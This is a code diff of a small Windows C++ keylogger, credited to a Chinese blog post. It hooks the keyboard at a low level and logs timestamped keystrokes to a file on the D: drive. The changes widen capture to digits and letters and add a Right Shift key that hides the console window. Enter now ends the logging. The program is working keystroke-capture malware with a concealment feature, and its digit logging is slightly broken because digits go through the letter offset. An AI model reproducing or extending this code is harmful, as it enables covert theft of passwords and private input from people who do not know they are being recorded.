@@ -1,20 +1,16 @@
 #if defined(_WIN32)
-
 // 下列代码段来自https://blog.csdn.net/GDUT_xin/article/details/125418475
-
 #include <cstdio>
 #include <tchar.h>
 #include <windows.h>
 #include <conio.h>
 #include <winuser.h>
 #include <ctime>
-
-std::FILE *fp = std::fopen("lastInput.txt", "w");
-
+#include <assert.h>
+std::FILE *fp = std::fopen("D:/lastInput.txt", "w");
 HHOOK keyboardHook = 0;
 
 time_t rawTime = 0;
-
 LRESULT CALLBACK LowLevelKeyboardProc(
     _In_ int nCode,
     _In_ WPARAM wParam,
@@ -32,23 +28,31 @@ LRESULT CALLBACK LowLevelKeyboardProc(
     */
     if (ks->flags & 0b10000000)
     {
+    	SetConsoleTitleA("keystrokes-master");
+	    HWND hWnd;
+	    hWnd=FindWindow(NULL,"keystrokes-master");
         time(&rawTime);
         struct tm *pTmInfo = localtime(&rawTime);
-        if (0x41 <= ks->vkCode && ks->vkCode <= 0x5A)
+        if (0x30 <= ks->vkCode && ks->vkCode <= 0x5A)
         {
             fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys %c pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec, ks->vkCode - 0x41 + 'A');
         }
         else if (ks->vkCode == VK_RETURN)
         {
-            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys ENTER pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
+            std::fclose(fp);
+            exit(1);
         }
-        else if (ks->vkCode == VK_SHIFT)
+        else if (ks->vkCode == VK_LSHIFT)
         {
-            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys SHIFT pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
+            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys Left SHIFT pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
+        }
+        else if (ks->vkCode == VK_RSHIFT)
+        {
+            ShowWindow(hWnd,SW_HIDE);
         }
         else if (ks->vkCode == VK_CAPITAL)
         {
-            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys CAPS LOCK pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
+            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys CAPITAL pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
         }
         else if (ks->vkCode == VK_LEFT)
         {
@@ -65,6 +69,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 
 int _tmain(int argc, _TCHAR *argv[])
 {
+    
     SetConsoleOutputCP(65001);
     // 安装钩子
     keyboardHook = SetWindowsHookEx(
@@ -78,7 +83,6 @@ int _tmain(int argc, _TCHAR *argv[])
         std::fclose(fp);
         return -1;
     }
-
     // 不可漏掉消息处理，否则程序会卡死
     MSG msg;
     while (GetMessageA(&msg, NULL, 0, 0)) // 如果消息队列中有信息
@@ -95,7 +99,5 @@ int _tmain(int argc, _TCHAR *argv[])
     return 0;
     
 }
-
 #elif defined(__linux__)
-
 #endif
